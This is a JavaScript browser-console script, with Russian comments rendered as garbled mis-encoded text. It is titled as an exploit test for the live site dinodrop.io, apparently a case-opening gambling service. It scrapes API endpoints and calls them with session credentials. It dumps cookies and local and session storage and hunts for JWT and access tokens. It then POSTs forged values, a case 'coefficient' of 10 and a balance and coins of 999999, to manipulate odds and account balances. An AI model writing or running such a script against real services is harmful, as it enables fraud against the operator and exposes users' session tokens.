/**
 * DinoDrop.io - –ë—ã—Å—Ç—Ä—ã–π —Ç–µ—Å—Ç —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ (–∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
 * –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∏ –≤—Å—Ç–∞–≤—å—Ç–µ —ç—Ç–æ—Ç –∫–æ–¥ –≤ –∫–æ–Ω—Å–æ–ª—å –±—Ä–∞—É–∑–µ—Ä–∞ –Ω–∞ —Å–∞–π—Ç–µ dinodrop.io
 */

console.log("üöÄ DinoDrop Quick Exploit Test - Starting...");

// –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∏—Å–∫–∞ —Ä–µ–∞–ª—å–Ω—ã—Ö API —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
async function findRealAPIEndpoints() {
    console.log("üîç Searching for real API endpoints...");
    
    // –ü–æ–∏—Å–∫ –≤ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö JS —Ñ–∞–π–ª–∞—Ö
    const scripts = Array.from(document.scripts);
    const apiPatterns = [
        /\/api\/[a-zA-Z0-9\/\-_]+/g,
        /\/cases\/[a-zA-Z0-9\/\-_]+/g,
        /\/user\/[a-zA-Z0-9\/\-_]+/g,
        /\/market\/[a-zA-Z0-9\/\-_]+/g,
        /\/auth\/[a-zA-Z0-9\/\-_]+/g
    ];
    
    const foundEndpoints = new Set();
    
    // –ê–Ω–∞–ª–∏–∑ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–æ–≤
    for (const script of scripts) {
        if (script.src) {
            try {
                const response = await fetch(script.src);
                const content = await response.text();
                
                apiPatterns.forEach(pattern => {
                    const matches = content.match(pattern);
                    if (matches) {
                        matches.forEach(match => foundEndpoints.add(match));
                    }
                });
            } catch (error) {
                console.log(`‚ö†Ô∏è Could not fetch script: ${script.src}`);
            }
        }
    }
    
    // –ü–æ–∏—Å–∫ –≤ –≥–ª–æ–±–∞–ª—å–Ω—ã—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
    try {
        const nextData = window.__NEXT_DATA__;
        if (nextData) {
            const dataStr = JSON.stringify(nextData);
            apiPatterns.forEach(pattern => {
                const matches = dataStr.match(pattern);
                if (matches) {
                    matches.forEach(match => foundEndpoints.add(match));
                }
            });
        }
    } catch (error) {
        console.log("‚ö†Ô∏è Could not access __NEXT_DATA__");
    }
    
    console.log("üìã Found API endpoints:", Array.from(foundEndpoints));
    return Array.from(foundEndpoints);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è API —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
async function testAPIEndpoint(endpoint, method = 'GET', data = null) {
    const baseUrl = window.location.origin;
    const fullUrl = baseUrl + endpoint;
    
    console.log(`üåê Testing ${method} ${fullUrl}`);
    
    const options = {
        method: method,
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
    };
    
    if (data && method !== 'GET') {
        options.body = JSON.stringify(data);
    }
    
    try {
        const response = await fetch(fullUrl, options);
        
        console.log(`üì• ${method} ${endpoint} - Status: ${response.status}`);
        
        if (response.status === 200) {
            try {
                const result = await response.json();
                console.log(`‚úÖ SUCCESS! Data:`, result);
                return { success: true, data: result, status: response.status };
            } catch (jsonError) {
                const text = await response.text();
                console.log(`üìÑ Response (not JSON):`, text.substring(0, 200) + '...');
                return { success: true, data: text, status: response.status };
            }
        } else if (response.status === 404) {
            console.log(`‚ùå Endpoint not found: ${endpoint}`);
            return { success: false, status: 404 };
        } else {
            console.log(`‚ö†Ô∏è Unexpected status ${response.status} for ${endpoint}`);
            return { success: false, status: response.status };
        }
    } catch (error) {
        console.log(`‚ùå Network error for ${endpoint}:`, error.message);
        return { success: false, error: error.message };
    }
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
async function runQuickExploitTest() {
    console.log("üéØ Starting comprehensive exploit test...");
    
    // 1. –ü–æ–∏—Å–∫ —Ä–µ–∞–ª—å–Ω—ã—Ö API —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
    const endpoints = await findRealAPIEndpoints();
    
    // 2. –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
    console.log("\nüì° Testing found endpoints...");
    const results = [];
    
    for (const endpoint of endpoints.slice(0, 10)) { // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–æ 10 —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
        const result = await testAPIEndpoint(endpoint);
        results.push({ endpoint, result });
        
        // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    // 3. –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
    console.log("\nüîß Testing standard endpoints...");
    const standardEndpoints = [
        '/api/cases',
        '/api/user/profile',
        '/api/user/balance',
        '/api/auth/status',
        '/api/market/items',
        '/cases/1',
        '/user/inventory'
    ];
    
    for (const endpoint of standardEndpoints) {
        const result = await testAPIEndpoint(endpoint);
        results.push({ endpoint, result });
        await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    // 4. –ê–Ω–∞–ª–∏–∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
    console.log("\nüóÑÔ∏è Analyzing local storage...");
    
    console.log("üì± LocalStorage:");
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        console.log(`  ${key}:`, value);
    }
    
    console.log("üç™ SessionStorage:");
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        console.log(`  ${key}:`, value);
    }
    
    console.log("üç™ Cookies:", document.cookie);
    
    // 5. –ü–æ–∏—Å–∫ —Ç–æ–∫–µ–Ω–æ–≤
    console.log("\nüîë Searching for authentication tokens...");
    const tokenPatterns = [
        /jwt[_-]?token/i,
        /bearer[_\s]+([a-zA-Z0-9\-._~+/]+=*)/i,
        /api[_-]?key/i,
        /access[_-]?token/i,
        /refresh[_-]?token/i,
        /eyJ[a-zA-Z0-9\-._~+/]+=*/g  // JWT pattern
    ];
    
    // –ü–æ–∏—Å–∫ –≤ localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        tokenPatterns.forEach(pattern => {
            if (pattern.test(key) || pattern.test(value)) {
                console.log(`üîë Potential token in localStorage[${key}]:`, value);
            }
        });
    }
    
    // 6. –ü–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ (–µ—Å–ª–∏ –Ω–∞–π–¥–µ–Ω—ã —Ä–∞–±–æ—á–∏–µ —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã)
    console.log("\n‚ö° Attempting exploitation...");
    
    const workingEndpoints = results.filter(r => r.result.success);
    console.log(`‚úÖ Found ${workingEndpoints.length} working endpoints`);
    
    for (const {endpoint, result} of workingEndpoints.slice(0, 3)) {
        console.log(`üéØ Trying to exploit: ${endpoint}`);
        
        // –ü–æ–ø—ã—Ç–∫–∞ POST –∑–∞–ø—Ä–æ—Å–∞ —Å —Ä–∞–∑–ª–∏—á–Ω—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
        if (endpoint.includes('case')) {
            const exploitResult = await testAPIEndpoint(endpoint, 'POST', {
                id: 1,
                coefficient: 10,  // –ü–æ–ø—ã—Ç–∫–∞ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–æ–º
                open: 1
            });
            console.log(`üé∞ Case exploit result:`, exploitResult);
        }
        
        if (endpoint.includes('user') || endpoint.includes('profile')) {
            const exploitResult = await testAPIEndpoint(endpoint, 'POST', {
                balance: 999999,  // –ü–æ–ø—ã—Ç–∫–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞
                coins: 999999
            });
            console.log(`üë§ User exploit result:`, exploitResult);
        }
    }
    
    // 7. –ò—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á–µ—Ç
    console.log("\nüìä EXPLOIT TEST SUMMARY");
    console.log("========================");
    console.log(`üì° Total endpoints tested: ${results.length}`);
    console.log(`‚úÖ Working endpoints: ${workingEndpoints.length}`);
    console.log(`‚ùå Failed endpoints: ${results.length - workingEndpoints.length}`);
    
    if (workingEndpoints.length > 0) {
        console.log("\nüéØ WORKING ENDPOINTS:");
        workingEndpoints.forEach(({endpoint, result}) => {
            console.log(`  ‚úÖ ${endpoint} (Status: ${result.status})`);
        });
    }
    
    console.log("\n‚ö†Ô∏è SECURITY RECOMMENDATIONS:");
    console.log("- Implement proper server-side validation");
    console.log("- Add rate limiting to API endpoints");
    console.log("- Validate all user inputs on the server");
    console.log("- Use proper authentication for sensitive endpoints");
    
    return results;
}

// –ó–∞–ø—É—Å–∫ —Ç–µ—Å—Ç–∞
runQuickExploitTest().then(results => {
    console.log("\nüéâ Exploit test completed!");
    console.log("Results saved to window.exploitResults");
    window.exploitResults = results;
}).catch(error => {
    console.error("‚ùå Exploit test failed:", error);
});

// –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Ç–∏–ª–∏—Ç—ã
window.quickTest = {
    testEndpoint: testAPIEndpoint,
    findEndpoints: findRealAPIEndpoints,
    runTest: runQuickExploitTest
};

console.log(`
üéØ Quick Exploit Test Loaded!

üìù Available commands:
- window.quickTest.runTest()           - –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–Ω—ã–π —Ç–µ—Å—Ç
- window.quickTest.testEndpoint(url)   - –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç
- window.quickTest.findEndpoints()     - –ù–∞–π—Ç–∏ API —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã
- window.exploitResults                - –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ —Ç–µ—Å—Ç–∞

‚ö†Ô∏è  –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö!
`);